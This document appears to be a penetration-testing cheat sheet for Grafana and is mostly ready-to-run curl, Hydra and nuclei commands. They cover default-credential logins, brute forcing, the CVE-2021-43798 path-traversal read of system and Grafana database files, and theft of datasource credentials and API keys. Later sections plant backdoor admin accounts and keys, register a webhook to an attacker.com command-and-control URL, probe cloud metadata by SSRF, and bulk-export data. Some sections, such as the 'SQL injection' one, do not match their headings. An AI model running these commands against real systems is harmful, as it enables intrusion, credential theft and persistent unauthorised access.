# Grafana

**`Default Port: 3000`**

**Grafana** is an open-source analytics and interactive visualization web application. It provides charts, graphs, and alerts when connected to supported data sources such as Prometheus, Elasticsearch, InfluxDB, and many others. Grafana is extremely popular in DevOps environments for monitoring infrastructure, applications, and business metrics. Misconfigurations can expose sensitive metrics, datasource credentials, and provide paths to compromise the underlying infrastructure.

### Connect <a href="#connect" id="connect"></a>

#### Using Web Browser <a href="#using-web-browser" id="using-web-browser"></a>

The primary way to access Grafana is through its web interface.

**Basic Web Access**

```
# HTTP access
http://target.com:3000

# HTTPS access (if configured)
https://target.com:3000
```

**Login and Dashboard Access**

```
# Login page
http://target.com:3000/login

# Direct dashboard access
http://target.com:3000/d/dashboard-id/dashboard-name
```

#### Using Grafana API <a href="#using-grafana-api" id="using-grafana-api"></a>

Grafana provides a comprehensive HTTP API for automation and integration.

**Basic API Access**

```
# Check API version
curl http://target.com:3000/api/health

# Get organization info
curl http://target.com:3000/api/org
```

**Authenticated API Access**

```
# With authentication (API key)
curl -H "Authorization: Bearer API_KEY" http://target.com:3000/api/dashboards/home

# With basic auth
curl -u admin:password http://target.com:3000/api/admin/settings
```

#### Using Grafana CLI <a href="#using-grafana-cli" id="using-grafana-cli"></a>

If you have shell access to the Grafana server, you can use the grafana-cli tool.

**Admin Operations**

```
# Reset admin password
grafana-cli admin reset-admin-password newpassword
```

**Plugin Management**

```
# List plugins
grafana-cli plugins list-remote

# Install plugin
grafana-cli plugins install plugin-name
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to detect Grafana installations and identify version information:

```
nmap -p 3000 -sV target.com
```

#### Banner Grabbing and Version Detection <a href="#banner-grabbing-and-version-detection" id="banner-grabbing-and-version-detection"></a>

Identify the Grafana version through various API endpoints and HTTP headers.

**Get Version Information**

```
# Get version from API
curl http://target.com:3000/api/health

# From login page
curl -s http://target.com:3000/login | grep -i "grafana"

# From HTTP headers
curl -I http://target.com:3000
```

**Get Build Information**

```
# Get build info (may require auth)
curl -u admin:admin http://target.com:3000/api/admin/settings
```

#### Anonymous Access Check <a href="#anonymous-access-check" id="anonymous-access-check"></a>

Grafana can be configured to allow anonymous access, which may expose sensitive dashboards.

**Test Anonymous Access**

```
# Check if anonymous access is enabled
curl http://target.com:3000/api/dashboards/home

# If returns data without auth, anonymous access is enabled
```

**Check Configuration**

```
# Check configuration
curl http://target.com:3000/api/org
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Dashboard Enumeration <a href="#dashboard-enumeration" id="dashboard-enumeration"></a>

Dashboards contain metrics and can reveal infrastructure details, database queries, and system architecture.

**List and Search Dashboards**

```
# List all dashboards (requires auth)
curl -u admin:password http://target.com:3000/api/search

# Search for specific dashboards
curl -u admin:password "http://target.com:3000/api/search?query=database"
```

**Get Dashboard Details**

```
# Get dashboard details
curl -u admin:password http://target.com:3000/api/dashboards/uid/DASHBOARD_UID

# Export dashboard
curl -u admin:password http://target.com:3000/api/dashboards/uid/DASHBOARD_UID > dashboard.json
```

#### Datasource Enumeration <a href="#datasource-enumeration" id="datasource-enumeration"></a>

Datasources contain connection strings, credentials, and sensitive configuration.

**List Datasources**

```
# List all datasources
curl -u admin:password http://target.com:3000/api/datasources

# Get datasource by ID
curl -u admin:password http://target.com:3000/api/datasources/1
```

**Extract Credentials**

```
# Search for credentials in datasources
curl -u admin:password http://target.com:3000/api/datasources | \
  jq -r '.[] | select(.password or .secureJsonData)'

# Datasources may contain:
# - Database credentials
# - API tokens
# - Connection strings
# - Internal IP addresses
```

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Understanding user accounts and their permissions helps in privilege escalation and identifying admin accounts.

**Organization Users**

```
# List all users (admin required)
curl -u admin:password http://target.com:3000/api/org/users

# Get current user
curl -u admin:password http://target.com:3000/api/user
```

**Global User List**

```
# List users globally (admin)
curl -u admin:password http://target.com:3000/api/users

# User permissions
curl -u admin:password http://target.com:3000/api/user/orgs
```

#### Organization and Team Enumeration <a href="#organization-and-team-enumeration" id="organization-and-team-enumeration"></a>

Organizations and teams control access to dashboards and datasources.

**List Organizations**

```
# List organizations
curl -u admin:password http://target.com:3000/api/orgs

# Current organization
curl -u admin:password http://target.com:3000/api/org
```

**List Teams and Members**

```
# Teams in organization
curl -u admin:password http://target.com:3000/api/teams/search

# Team members
curl -u admin:password http://target.com:3000/api/teams/1/members
```

#### Plugin Enumeration <a href="#plugin-enumeration" id="plugin-enumeration"></a>

Plugins can introduce vulnerabilities and provide additional attack surface.

**List Installed Plugins**

```
# List installed plugins
curl -u admin:password http://target.com:3000/api/plugins

# Get plugin details
curl -u admin:password http://target.com:3000/api/plugins/plugin-name/settings
```

**Check Plugin Versions**

```
# Check for vulnerable plugins
curl -u admin:password http://target.com:3000/api/plugins | jq -r '.[].info.version'
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

Grafana's most common misconfiguration is unchanged default credentials.

**Test Default Login**

```
# Default credentials
admin:admin

# Try login via API
curl -X POST http://target.com:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}'
```

**Web Interface Login**

```
# Web interface
# Navigate to http://target.com:3000/login
# Username: admin
# Password: admin
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

If default credentials don't work, you can attempt brute force attacks.

**Using Hydra**

```
# Using hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/login:user=^USER^&password=^PASS^:F=Invalid username or password"
```

**Custom Brute Force Script**

```
# Using custom script
for pass in $(cat passwords.txt); do
  response=$(curl -s -X POST http://target.com:3000/login \
    -H "Content-Type: application/json" \
    -d "{\"user\":\"admin\",\"password\":\"$pass\"}")
  if [[ $response != *"Invalid"* ]]; then
    echo "[+] Found: admin:$pass"
    break
  fi
done
```

#### Path Traversal (CVE-2021-43798) <a href="#path-traversal-cve-2021-43798" id="path-traversal-cve-2021-43798"></a>

Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to arbitrary file read.

**Exploit Path Traversal**

```
# Exploit path traversal
curl http://target.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd

# Read Grafana configuration
curl http://target.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini

# Read datasource credentials
curl http://target.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
```

**Automated Exploitation**

```
# Using nuclei
nuclei -u http://target.com:3000 -t cves/2021/CVE-2021-43798.yaml
```

#### SQL Injection in Data Sources <a href="#sql-injection-in-data-sources" id="sql-injection-in-data-sources"></a>

If you can create or modify datasources, you can inject SQL to access databases.

**Create Malicious Datasource**

```
# Create malicious MySQL datasource
curl -X POST http://target.com:3000/api/datasources \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Malicious DB",
    "type": "mysql",
    "url": "target-db:3306",
    "database": "test",
    "user": "root",
    "secureJsonData": {
      "password": "password"
    }
  }'
```

**Query Through Grafana**

```
# Query database through Grafana
# Grafana acts as a proxy to internal databases
```

#### API Key Theft <a href="#api-key-theft" id="api-key-theft"></a>

API keys provide programmatic access to Grafana and should be extracted if possible.

**List and Extract API Keys**

```
# List API keys (admin required)
curl -u admin:password http://target.com:3000/api/auth/keys
```

**Create and Use API Keys**

```
# Create new API key
curl -X POST http://target.com:3000/api/auth/keys \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"name":"backdoor","role":"Admin"}'

# Use API key
curl -H "Authorization: Bearer API_KEY" http://target.com:3000/api/datasources
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Datasource Credential Extraction <a href="#datasource-credential-extraction" id="datasource-credential-extraction"></a>

Extracting datasource credentials provides access to backend databases and services.

**Extract via API**

```
# Get all datasources with credentials
curl -u admin:password http://target.com:3000/api/datasources | jq .
```

**Extract from Database**

```
# Extract from grafana.db (if you have file access)
sqlite3 /var/lib/grafana/grafana.db "SELECT * FROM data_source;"

# Passwords are encrypted, but key is in grafana.ini
cat /etc/grafana/grafana.ini | grep secret_key

# Decrypt passwords (if you have the secret key)
# Grafana uses AES-256-CFB encryption
```

#### SSRF via Datasources <a href="#ssrf-via-datasources" id="ssrf-via-datasources"></a>

Grafana datasources can be abused to perform SSRF attacks against internal services.

**Create Internal Datasource**

```
# Create datasource pointing to internal service
curl -X POST http://target.com:3000/api/datasources \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Internal Service",
    "type": "prometheus",
    "url": "http://internal-service:9090",
    "access": "proxy"
  }'
```

**Access Cloud Metadata**

```
# Query internal service through Grafana
# Access cloud metadata
curl -X POST http://target.com:3000/api/datasources \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

If you have viewer access, you can escalate to admin through various methods.

**Create Admin User**

```
# Create admin user (if you're already admin)
curl -X POST http://target.com:3000/api/admin/users \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"name":"backdoor","login":"backdoor","password":"P@ssw0rd123!","role":"Admin"}'
```

**Promote Existing Users**

```
# Promote existing user to admin
curl -X PATCH http://target.com:3000/api/org/users/USER_ID \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"role":"Admin"}'
```

#### Persistence <a href="#persistence" id="persistence"></a>

Establishing persistent access to Grafana.

**Create Backdoor Accounts**

```
# Create backdoor admin account
curl -X POST http://target.com:3000/api/admin/users \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{
    "name":"System Monitor",
    "login":"sysmon",
    "password":"ComplexP@ss123!",
    "role":"Admin"
  }'
```

**Create API Keys and Webhooks**

```
# Create API key with admin role
curl -X POST http://target.com:3000/api/auth/keys \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"name":"backup","role":"Admin","secondsToLive":31536000}'

# Create webhook notification channel for C2
curl -X POST http://target.com:3000/api/alert-notifications \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{
    "name":"monitoring",
    "type":"webhook",
    "settings":{"url":"http://attacker.com/c2"}
  }'
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Grafana dashboards and datasources can reveal sensitive infrastructure information.

**Export Dashboards and Datasources**

```
# Export all dashboards
for uid in $(curl -s -u admin:password http://target.com:3000/api/search | jq -r '.[].uid'); do
  curl -u admin:password http://target.com:3000/api/dashboards/uid/$uid > dashboard_$uid.json
done

# Export all datasources (contains credentials)
curl -u admin:password http://target.com:3000/api/datasources > datasources.json
```

**Export Users and Settings**

```
# Export users
curl -u admin:password http://target.com:3000/api/org/users > users.json

# Export organization settings
curl -u admin:password http://target.com:3000/api/org > org_settings.json

# Backup entire Grafana database
# If you have file access
cp /var/lib/grafana/grafana.db /tmp/stolen.db
```

### Common Grafana API Endpoints <a href="#common-grafana-api-endpoints" id="common-grafana-api-endpoints"></a>

| Endpoint               | Method | Description       | Auth Required |
| ---------------------- | ------ | ----------------- | ------------- |
| `/api/health`          | GET    | Health check      | No            |
| `/api/login`           | POST   | Login             | No            |
| `/api/dashboards/home` | GET    | Home dashboard    | Yes           |
| `/api/search`          | GET    | Search dashboards | Yes           |
| `/api/datasources`     | GET    | List datasources  | Admin         |
| `/api/users`           | GET    | List users        | Admin         |
| `/api/org/users`       | GET    | Org users         | Admin         |
| `/api/auth/keys`       | GET    | List API keys     | Admin         |
| `/api/admin/settings`  | GET    | Settings          | Admin         |

### Grafana Default Paths <a href="#grafana-default-paths" id="grafana-default-paths"></a>

| Path                          | Description        | Sensitive             |
| ----------------------------- | ------------------ | --------------------- |
| `/etc/grafana/grafana.ini`    | Configuration file | Yes - secret\_key     |
| `/var/lib/grafana/grafana.db` | SQLite database    | Yes - all data        |
| `/var/lib/grafana/plugins/`   | Plugin directory   | Maybe                 |
| `/var/log/grafana/`           | Log files          | Yes - errors, queries |
| `/usr/share/grafana/`         | Installation dir   | No                    |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool           | Description           | Primary Use Case     |
| -------------- | --------------------- | -------------------- |
| curl           | HTTP client           | API interaction      |
| Burp Suite     | Web proxy             | Request manipulation |
| nuclei         | Vulnerability scanner | CVE detection        |
| Grafana CLI    | Management tool       | Admin operations     |
| jq             | JSON processor        | API response parsing |
| grafana-backup | Backup tool           | Data extraction      |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ Default credentials (admin:admin)
* ❌ Anonymous access enabled
* ❌ No authentication required
* ❌ Weak admin passwords
* ❌ API keys with excessive permissions
* ❌ Exposed to internet without firewall
* ❌ Outdated Grafana version (CVE vulnerable)
* ❌ Datasource credentials in plaintext
* ❌ No rate limiting on login
* ❌ Signup enabled for anyone
* ❌ Viewer role can access sensitive data
* ❌ No audit logging
* ❌ Plugins from untrusted sources
* ❌ secret\_key not changed from default

### Common Grafana CVEs <a href="#common-grafana-cves" id="common-grafana-cves"></a>

| CVE            | Version Affected | Description                    | Severity |
| -------------- | ---------------- | ------------------------------ | -------- |
| CVE-2021-43798 | 8.0.0-8.3.0      | Arbitrary file read            | Critical |
| CVE-2021-43813 | <8.3.1           | Directory traversal            | High     |
| CVE-2021-39226 | <8.1.6           | Snapshot authentication bypass | High     |
| CVE-2020-13379 | <7.0.2           | SSRF via datasource            | High     |
| CVE-2019-15043 | <6.3.4           | Authentication bypass          | Critical |

<br>
